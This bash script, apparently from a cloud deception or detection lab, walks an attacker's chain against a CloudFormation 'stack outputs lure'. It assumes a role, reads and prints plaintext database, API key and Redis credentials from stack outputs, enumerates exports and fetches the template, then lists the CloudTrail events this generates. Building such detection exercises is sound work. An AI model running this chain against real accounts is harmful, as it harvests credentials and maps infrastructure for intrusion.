#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 21 (CloudFormation Stack Outputs Lure)
#
# This script walks through the attack chain step by step with colored output.
# The attacker assumes the discovery role, lists stacks, reads outputs containing
# plaintext credentials, and enumerates cross-stack exports.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 21 — ABUSE CHAIN"
echo "  CloudFormation Stack Outputs Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming discovery role: cfn-audit-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/cfn-audit-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-cfn-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "${CREDS}" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS}" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "${CREDS}" | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing CloudFormation stacks"
# ---------------------------------------------------------------
attack "cloudformation:ListStacks"
echo ""
echo -e "${YELLOW}--- Active Stacks ---${NC}"
aws cloudformation list-stacks \
  --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE \
  --query "StackSummaries[].{Name:StackName,Status:StackStatus,Created:CreationTime}" \
  --output table
echo ""
info "Target identified: prod-core-infrastructure"

# ---------------------------------------------------------------
step "4" "Reading stack outputs: prod-core-infrastructure"
# ---------------------------------------------------------------
attack "cloudformation:DescribeStacks → prod-core-infrastructure"
echo ""
echo -e "${YELLOW}--- Stack Outputs (exposed credentials) ---${NC}"
aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[].{Key:OutputKey,Value:OutputValue}" \
  --output table
echo ""

# ---------------------------------------------------------------
step "5" "Extracting specific credentials from outputs"
# ---------------------------------------------------------------
info "Extracting credentials from stack outputs..."
echo ""

DB_ENDPOINT=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='DatabaseEndpoint'].OutputValue" \
  --output text)
DB_PASSWORD=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='DatabasePassword'].OutputValue" \
  --output text)
API_URL=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='ApiGatewayUrl'].OutputValue" \
  --output text)
API_KEY=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='ApiKey'].OutputValue" \
  --output text)
REDIS_ENDPOINT=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='RedisEndpoint'].OutputValue" \
  --output text)
REDIS_AUTH=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='RedisAuthToken'].OutputValue" \
  --output text)
ADMIN_URL=$(aws cloudformation describe-stacks \
  --stack-name prod-core-infrastructure \
  --query "Stacks[0].Outputs[?OutputKey=='AdminDashboardUrl'].OutputValue" \
  --output text)

echo -e "${YELLOW}--- Extracted Credentials ---${NC}"
echo "  Database:"
echo "    Endpoint : ${DB_ENDPOINT}"
echo "    Password : ${DB_PASSWORD}"
echo ""
echo "  API Gateway:"
echo "    URL      : ${API_URL}"
echo "    API Key  : ${API_KEY}"
echo ""
echo "  Redis:"
echo "    Endpoint : ${REDIS_ENDPOINT}"
echo "    Auth     : ${REDIS_AUTH}"
echo ""
echo "  Admin Dashboard:"
echo "    URL      : ${ADMIN_URL}"
echo ""

# ---------------------------------------------------------------
step "6" "Enumerating cross-stack exports"
# ---------------------------------------------------------------
attack "cloudformation:ListExports"
echo ""
echo -e "${YELLOW}--- Cross-Stack Exports ---${NC}"
aws cloudformation list-exports \
  --query "Exports[?starts_with(Name, 'prod-')].{Name:Name,Value:Value}" \
  --output table
echo ""

warn "Exports reveal VPC, subnet, and security group IDs"
warn "Attacker can use these for lateral movement planning"

# ---------------------------------------------------------------
step "7" "Attempting to read the stack template"
# ---------------------------------------------------------------
attack "cloudformation:GetTemplate → prod-core-infrastructure"
echo ""
echo -e "${YELLOW}--- Stack Template (excerpt) ---${NC}"
aws cloudformation get-template \
  --stack-name prod-core-infrastructure \
  --query "TemplateBody" \
  --output text | head -30
echo "  ..."
echo ""
info "Full template reveals resource structure and parameter references"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "8" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on cfn-audit-readonly-role"
echo "  • CloudTrail: ListStacks"
echo "  • CloudTrail: DescribeStacks on prod-core-infrastructure (×2)"
echo "  • CloudTrail: ListExports"
echo "  • CloudTrail: GetTemplate on prod-core-infrastructure"
echo ""
echo -e "${YELLOW}Total CloudTrail events: 6${NC}"
echo ""
